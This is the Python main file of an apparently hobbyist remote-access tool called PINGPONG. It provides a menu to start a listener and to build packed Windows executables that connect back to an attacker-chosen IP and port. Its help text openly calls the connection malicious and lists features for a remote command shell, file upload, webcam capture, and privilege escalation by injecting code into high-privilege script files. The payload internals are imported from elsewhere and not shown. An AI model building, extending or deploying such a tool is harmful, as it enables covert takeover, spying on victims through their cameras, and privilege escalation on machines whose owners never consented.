# -*- coding:utf-8 -*-
# @FileName  :main.py
# @Time      :2022/11/07 20:27:59
# @Author    :D0WE1L1N\
import handler
import payload.payload_packer
import config_set
import threading
import sys
#print的基本函数
#PINPONG 攻击载荷文件夹：payload/PINGPONG_payload_file
def print_error(str):
    print('\033[0;31m'+ str + '\033[0m')
def print_good(str):
    print('\033[0;36m'+ str + '\033[0m')
def print_warn(str):
    print('\033[0;33m'+ str + '\033[0m')
def print_normal(str):
    print('\033[0;34m'+ str + '\033[0m')
#主程序
def print_main():
    print_good(
        '''\033[0;35m
(    (        )             (        )      )            ____ 
)\ ) )\ )  ( /(  (          )\ )  ( /(   ( /(  (        |   / 
(()/((()/(  )\()) )\ )      (()/(  )\())  )\()) )\ )     |  /  
/(_))/(_))((_)\ (()/(       /(_))((_)\  ((_)\ (()/(     | /   
(_)) (_))   _((_) /(_))_    (_))    ((_)  _((_) /(_))_   |/    
| _ \|_ _| | \| |(_)) __|   | _ \  / _ \ | \| |(_)) __| (      
|  _/ | |  | .` |  | (_ |   |  _/ | (_) || .` |  | (_ | )\     
|_|  |___| |_|\_|   \___|   |_|    \___/ |_|\_|   \___|((_)    
                                                            

========================WELCOME !!========================
====================Wescan   V0.0.3.1 ====================
====================Aurthor : D0WE1L1N====================                                                                                                                
    \033[0m''')
    main()
#选择
def sub_main():
    choice = input("choose your choice>")
    if choice == "1":
       startserver()
    elif choice == "2":
        print_normal("type of payload:")
        print_normal("1) PINGPONG windows x64")
        print_warn("YOU NEED TO INSTALL UPX AND PYINSTALLER, if you already install BOTH of it, ignore this")
        type = input("choose your choice>")
        back_to_main(type)
        if type == "1":
            upx_dir = input("payload>[*]Please enter your upx dir(blank for u don't have it)>")
            back_to_main(upx_dir)
            # payload.payload_packer.pack("_basic_conn.py", ip, port, False)
            payload.payload_packer.pack("PINGPONG_payload/PINGPONG_payload", True, upx_dir)
            sub_main()
        else:
            print_error('[-]no such choice')
            sub_main()
    elif choice == '3':
        import config.config_settings_GUI
        config.config_settings_GUI.load_all_config()
        t = threading.Thread(target=config.config_settings_GUI.settings_GUI_INIT())
        t.start()
        t.join()
        is_auto_load_config = config_set.load_config_for_main_py("is_auto_load_config")
        is_auto_load_config = is_auto_load_config.get()
        if is_auto_load_config == 1:
            config_set.config_load()
        else:
            print_warn("use 'reload' command to load your settings!")
        sub_main()
    elif choice == '4' or choice == 'help' or choice == 'HELP':
        print_good(""" 
-----------------------------HELP-----------------------------
for main:
    command:
        1) handler
            start a listener on a ip and port
            an ip and port must be given
        2) payload
            make a payload which can send a socket connect to a ip and port
            an ip and port must be given
            it will be a .exe file
            start a handler and use that file and u can start a PINGPONG connection
        3) settings
            for handler:
                listen_Default_ip : the ip to bind when the ip is not given when u use the handler
                listen_Default_port : the port to bind when the port is not given when u use the handler
                Autocommand : the command which will run immediately when u got a PINGPONG shell
            for payload:
                Default_ip : The ip to sent the connect when the ip is not given when u use the payload generater
                Default_port : The port to sent the connect when the port is not given when u use the payload generater
                usage : the usage of the payload
        4) PINGPONG shell
            the PINGPONG shell is a malicious connection and it will start when you use the listener to listen the ip and port which your payload set
            usage:
                the usage of the shell is set when you generate the payload
                if u have this usage, type command to use it:
                    cmd : make a cmd connection
                    upload : upload your file
                    cam_shot : take shot
                    priv_vbp_listen : when a high-priv file(.vbs .bat .psl) is created, inject code which can make your priv higher   
        
        """)
        main()
    elif choice == "PING":
        print("PONG")
        sub_main()
    elif choice == "exit":
        print("exiting......")
        sys.exit(0)
    elif choice == "reload":
        config_set.config_load()
        print_normal('settings>[*]Done')
        sub_main()
    else:
        print_error("[-]no such choice")
        main()
def main():
    print_normal("Active choice:")
    print_normal("1) Start a PINGPONG handler")
    print_normal("2) Make payload(s)")
    # print_normal("type 'reload' to reload your settings!")
    print_normal("3) Settings")
    print_normal("4) Help")
    sub_main()
def startserver():
    handler.startserver(True, is_input=True)
def config_load_init():
    global _global_dict
    _global_dict = {}
def set_config(key, value):
    _global_dict[key] = value
def get_value(key, defValue=None):
    try:
        return _global_dict[key]
    except KeyError:
        return defValue
def get_all_keys():
    key_list = []
    for key in _global_dict.keys():
        key_list.append(key)
    return key_list 
def back_to_main(var):
    if var == 'back' or var =='BACK':
        sub_main()
if __name__ == "__main__":
    config_set.config_load()
    print_main()
